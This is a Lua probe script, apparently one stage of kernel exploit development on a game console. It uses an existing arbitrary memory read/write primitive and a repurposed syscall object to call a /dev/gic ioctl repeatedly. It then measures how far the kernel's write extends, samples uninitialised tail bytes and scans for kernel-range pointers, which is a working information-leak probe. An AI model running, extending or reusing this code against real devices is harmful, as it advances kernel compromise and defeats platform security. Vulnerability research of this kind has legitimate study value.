-- CRASH_CLASS: LOW
-- PROBE 475d: how far does the gic write run, and what is in the tail?
--
-- Context: 475c showed the write is not 14 bytes. Behind the fixed
-- {u32 0x00010002; "CUSA\u0000"} head the page came back with sixteen bytes
-- that were different on every one of three calls. Either the handler copies a
-- larger structure out of kernel memory, or it copies a stack struct whose tail
-- is uninitialised. This probe measures the write extent and samples the tail
-- half a dozen times to see what is stable, what varies, and whether any of it
-- looks like kernel memory.

print("=== PROBE 475d: extent and content of the gic write ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" and v.h then h, l = v.h, v.l end
    if h % 0x100000000 == 0xFFFFFFFF and l % 0x100000000 == 0xFFFFFFFF then return -1 end
    if h == 0 and l >= 0x80000000 then return l - 0x100000000 end
    return l
end
local function put_str(s)
    local buf = memory.alloc(#s + 1)
    for i = 1, #s do pcall(function() memory.write_byte(buf + i - 1, s:byte(i)) end) end
    pcall(function() memory.write_byte(buf + #s, 0) end)
    return buf
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) % 0x100 end
    return -1
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_ioctl = make_syscall(54)
local CMD = 0xC0104701

local fd = sgn(sc_open(uint64(put_str("/dev/gic")), uint64(2), uint64(0)))
print("fd=" .. fd)
if fd < 0 then
    print("=== PROBE 475d ABORTED ===")
    return
end

local arg = memory.alloc(0x40)
local target = memory.alloc(0x1000)

local function set_q0(addr)
    for off = 0, 0x3C, 4 do wd(arg + off, 0) end
    local ok = pcall(function() memory.write_qword(arg, uint64(addr)) end)
    if ok then return true end
    local hi = math.floor(addr / 4294967296)
    local lo = addr % 4294967296
    return pcall(function() memory.write_qword(arg, uint64(string.format("0x%X%08X", hi, lo))) end)
end
local function call_at(addr)
    set_q0(addr)
    return sgn(sc_ioctl(uint64(fd), uint64(CMD), uint64(arg)))
end

local function fill_target(v)
    for off = 0, 0xFFC, 4 do wd(target + off, v) end
end

-- byte-aligned hex+ascii row dump, 16 bytes per row
local function row(buf, off)
    local hex, asc = {}, {}
    for i = 0, 15 do
        local b = rb(buf + off + i)
        hex[#hex + 1] = string.format("%02X", b)
        if b >= 0x20 and b < 0x7F then
            asc[#asc + 1] = string.char(b)
        else
            asc[#asc + 1] = "."
        end
    end
    return string.format("    +%03X  %s  |%s|", off, table.concat(hex, " "), table.concat(asc, ""))
end

print(string.format("[0] arg=0x%X target=0x%X", to_num(arg), to_num(target)))

print("")
print("[A] one call, then every byte that differed from the fill pattern")
fill_target(0xC0FFEE00)
local r = call_at(target)
print("    ret=" .. r)
local first, last, n = nil, nil, 0
for off = 0, 0xFFF do
    local b = rb(target + off)
    local want = ({[0] = 0x00, [1] = 0xEE, [2] = 0xFF, [3] = 0xC0})[off % 4]
    if b ~= want then
        n = n + 1
        if not first then first = off end
        last = off
    end
end
print(string.format("    changed=%d first=+%s last=+%s", n,
    first and string.format("0x%X", first) or "none",
    last and string.format("0x%X", last) or "none"))

print("")
print("[B] the first 0x60 bytes, rows of 16")
for off = 0, 0x50, 16 do print(row(target, off)) end

print("")
print("[C] six further calls, collecting the same window")
local samples = {}
for k = 1, 6 do
    fill_target(0x11112222)
    local rk = call_at(target)
    local line = {}
    for i = 0, 15 do line[#line + 1] = string.format("%02X", rb(target + 0x10 + i)) end
    samples[#samples + 1] = table.concat(line, " ")
    print(string.format("    call%d ret=%d  0x10..0x1F  %s", k, rk, table.concat(line, " ")))
end

print("")
print("[D] which bytes at 0x00..0x3F ever differed between calls")
local base = {}
fill_target(0x11112222)
call_at(target)
for i = 0, 0x3F do base[i] = rb(target + i) end
local unstable = 0
for k = 1, 4 do
    fill_target(0x11112222)
    call_at(target)
    for i = 0, 0x3F do
        if rb(target + i) ~= base[i] then unstable = unstable + 1 end
    end
end
print("    differing byte-readings across 4 comparisons: " .. unstable)

print("")
print("[E] kernel-pointer shaped qwords anywhere in the first 0x400 bytes")
local hits = 0
for off = 0, 0x3F8, 4 do
    local hi = rb(target + off + 3) * 0x1000000 + rb(target + off + 2) * 0x10000
             + rb(target + off + 1) * 0x100 + rb(target + off)
    local hq = rb(target + off + 7) * 0x1000000 + rb(target + off + 6) * 0x10000
             + rb(target + off + 5) * 0x100 + rb(target + off + 4)
    if hq >= 0xFFFF8000 then
        hits = hits + 1
        print(string.format("    +0x%03X  %08X%08X  kernel-range", off, hq, hi))
    end
end
if hits == 0 then print("    none") end

pcall(function() sc_close(uint64(fd)) end)
print("")
print("=== PROBE 475d COMPLETE ===")
